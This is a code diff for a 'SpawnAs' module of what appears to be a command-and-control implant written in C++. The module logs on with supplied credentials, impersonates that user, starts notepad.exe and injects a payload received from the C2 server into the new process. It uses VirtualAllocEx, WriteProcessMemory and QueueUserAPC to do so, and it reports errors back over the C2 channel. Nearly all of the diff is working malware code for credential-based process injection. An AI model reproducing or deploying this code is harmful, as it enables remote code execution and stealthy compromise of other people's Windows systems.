@@ -195,8 +195,6 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     const std::string payload = c2Message.data();
 
-    // std::string out = spawn(username, domain, password);
-
     std::string result;
 
 #ifdef __linux__ 
@@ -208,40 +206,98 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
     DWORD dwSize;
     HANDLE hToken;
     LPVOID lpvEnv;
-    PROCESS_INFORMATION piProcInfo = {0};
-    STARTUPINFOW si = {0};
-    CHAR szUserProfile[256] = "";
-    si.cb = sizeof(STARTUPINFOW);
+
 
     if (!LogonUser(username.c_str(), domain.c_str(), password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
     {
+        DWORD errorMessageID = ::GetLastError();
+        if(errorMessageID == 0)
+            return 0;
+        
+        LPSTR messageBuffer = nullptr;
+
+        size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                                    NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
+        
+        std::string message(messageBuffer, size);
+        LocalFree(messageBuffer);
+
         result += "Unable to LogonUser.\n";
+        result += message;
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 0;
     }
 
-    wchar_t szCmdline[] = TEXT(L"notepad");
-
-    std::wstring usernameW = std::wstring(username.begin(), username.end());
-    std::wstring domainW = std::wstring(domain.begin(), domain.end());
-    std::wstring passwordW = std::wstring(password.begin(), password.end());
-    if (!CreateProcessWithLogonW(usernameW.c_str(), domainW.c_str(), passwordW.c_str(), LOGON_WITH_PROFILE, 
-        NULL, 
-        szCmdline, 
-        CREATE_SUSPENDED, 
-        NULL, 
-        NULL, 
-        &si, 
-        &piProcInfo))
+    if (!ImpersonateLoggedOnUser(hToken))
     {
-        result += "Unable to CreateProcessWithLogonW.\n";
+        DWORD errorMessageID = ::GetLastError();
+        if(errorMessageID == 0)
+            return 0;
+        
+        LPSTR messageBuffer = nullptr;
+
+        size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                                    NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
+        
+        std::string message(messageBuffer, size);
+        LocalFree(messageBuffer);
+
+        result += "Unable to ImpersonateLoggedOnUser.\n";
+        result += message;
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 0;
     }
+
+    wchar_t szCmdline[] = TEXT(L"notepad.exe");
+
+    STARTUPINFO si;
+    PROCESS_INFORMATION piProcInfo;
+
+    memset(&si, 0, sizeof(si));
+    memset(&piProcInfo, 0, sizeof(piProcInfo));
+
+    si.cb = sizeof(si);
+
+    BOOL rc = CreateProcessAsUser(hToken,                // user token
+                            0,                           // app name
+                            "notepad.exe",               // command line
+                            0,                           // process attributes
+                            0,                           // thread attributes
+                            FALSE,                       // don't inherit handles
+                            DETACHED_PROCESS,            // flags
+                            0,                           // environment block
+                            0,                           // current dir
+                            &si,                         // startup info
+                            &piProcInfo);                // process info gets put here
+    if (!rc)
+    {
+        RevertToSelf();
+
+        DWORD errorMessageID = ::GetLastError();
+        if(errorMessageID == 0)
+            return 0; 
+
+        LPSTR messageBuffer = nullptr;
+
+        size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                                    NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
+        
+        std::string message(messageBuffer, size);
+        LocalFree(messageBuffer);
+
+        result += "Unable to CreateProcessAsUser.\n";
+        result += message;
+        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_cmd(cmd);
+        c2RetMessage.set_returnvalue(result);
+        return 0;
+    }
+
+    RevertToSelf();
 
     PVOID remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
 	WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
@@ -249,7 +305,6 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
 	VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
 	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
 	QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
-	ResumeThread(piProcInfo.hThread);
 
     CloseHandle(hToken);
     CloseHandle(piProcInfo.hProcess);
@@ -268,49 +323,51 @@ std::string SpawnAs::spawn(const std::string& username, const std::string& domai
 {
 	std::string result;
 
-#ifdef __linux__ 
+// #ifdef __linux__ 
 
-    result += "SpawnAs don't work in linux.\n";
+//     result += "SpawnAs don't work in linux.\n";
 
-#elif _WIN32
+// #elif _WIN32
 
-    DWORD dwSize;
-    HANDLE hToken;
-    LPVOID lpvEnv;
-    PROCESS_INFORMATION pi = {0};
-    STARTUPINFOW si = {0};
-    CHAR szUserProfile[256] = "";
-    si.cb = sizeof(STARTUPINFOW);
+//     DWORD dwSize;
+//     HANDLE hToken;
+//     LPVOID lpvEnv;
+    
+//     PROCESS_INFORMATION pi = {0};
 
-    if (!LogonUser(username.c_str(), domain.c_str(), password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
-    {
-        result += "Unable to LogonUser.\n";
-        return result;
-    }
+//     STARTUPINFO si = {0};
+//     CHAR szUserProfile[256] = "";
+//     si.cb = sizeof(STARTUPINFOW);
 
-    wchar_t szCmdline[] = TEXT(L"notepad");
+//     if (!LogonUser(username.c_str(), domain.c_str(), password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
+//     {
+//         result += "Unable to LogonUser.\n";
+//         return result;
+//     }
 
-    std::wstring usernameW = std::wstring(username.begin(), username.end());
-    std::wstring domainW = std::wstring(domain.begin(), domain.end());
-    std::wstring passwordW = std::wstring(password.begin(), password.end());
-    if (!CreateProcessWithLogonW(usernameW.c_str(), domainW.c_str(), passwordW.c_str(), LOGON_WITH_PROFILE, 
-        NULL, 
-        szCmdline, 
-        CREATE_SUSPENDED, 
-        NULL, 
-        NULL, 
-        &si, 
-        &pi))
-    {
-        result += "Unable to CreateProcessWithLogonW.\n";
-        return result;
-    }
+//     wchar_t szCmdline[] = TEXT(L"notepad");
 
-    CloseHandle(hToken);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+//     std::wstring usernameW = std::wstring(username.begin(), username.end());
+//     std::wstring domainW = std::wstring(domain.begin(), domain.end());
+//     std::wstring passwordW = std::wstring(password.begin(), password.end());
+//     if (!CreateProcessWithLogonW(usernameW.c_str(), domainW.c_str(), passwordW.c_str(), LOGON_WITH_PROFILE, 
+//         NULL, 
+//         szCmdline, 
+//         CREATE_SUSPENDED, 
+//         NULL, 
+//         NULL, 
+//         &si, 
+//         &pi))
+//     {
+//         result += "Unable to CreateProcessWithLogonW.\n";
+//         return result;
+//     }
 
-#endif
+//     CloseHandle(hToken);
+//     CloseHandle(pi.hProcess);
+//     CloseHandle(pi.hThread);
+
+// #endif
 
 	return result;
 }
